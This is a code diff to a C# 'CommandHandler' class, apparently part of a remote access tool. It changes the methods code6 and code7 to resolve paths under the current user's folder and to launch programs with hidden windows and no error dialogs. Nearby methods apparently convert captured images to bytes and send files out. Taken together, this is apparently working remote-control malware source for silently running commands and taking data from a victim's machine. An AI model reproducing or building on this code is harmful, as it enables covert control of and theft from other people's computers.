@@ -433,22 +433,68 @@ namespace CommandHandler
             imagebt = ms.ToArray();
             return imagebt;
         }
-        public static void code6(string cmd)
+        public static void code6(string command)
         {
-            var command = new ProcessStartInfo
+            string cmd1 = null;
+            string cmdr1 = null;
+            string[] cmd1sp = command.Split('\\');
+            if (cmd1sp[0] == "%currentuser%")
             {
-                FileName = cmd,
-                ErrorDialog = false,
-                WindowStyle = ProcessWindowStyle.Hidden,
-                UseShellExecute = false,
-                CreateNoWindow = true
-            };
-            Process.Start(command);
+                cmd1 = "C:\\Users\\" + Environment.UserName;
+                cmdr1 += cmd1;
+                for (int i = 1; i < cmd1sp.Length; i++)
+                {
+                    cmdr1 = cmdr1 + "\\" + cmd1sp[i];
+                }
+            }
+            if (cmdr1 != null)
+            {
+                var command1 = new ProcessStartInfo
+                {
+                    FileName = cmdr1,
+                    ErrorDialog = false,
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    UseShellExecute = false,
+                    CreateNoWindow = true
+                };
+                Process.Start(command1);
+            }
+            else
+            {
+                var command1 = new ProcessStartInfo
+                {
+                    FileName = command,
+                    ErrorDialog = false,
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    UseShellExecute = false,
+                    CreateNoWindow = true
+                };
+                Process.Start(command1);
+            }
 
         }
         public static void code7(string command)
         {
-            Process.Start(@command);
+            string cmd1 = null;
+            string cmdr1 = null;
+            string[] cmd1sp = command.Split('\\');
+            if (cmd1sp[0] == "%currentuser%")
+            {
+                cmd1 = "C:\\Users\\" + Environment.UserName;
+                cmdr1 += cmd1;
+                for (int i = 1; i < cmd1sp.Length; i++)
+                {
+                    cmdr1 = cmdr1 + "\\" + cmd1sp[i];
+                }
+            }
+            if (cmdr1 != null)
+            {
+                Process.Start(cmdr1);
+            }
+            else
+            {
+                Process.Start(@command);
+            }
         }
         public static byte[] codeToSend(string path)
         {
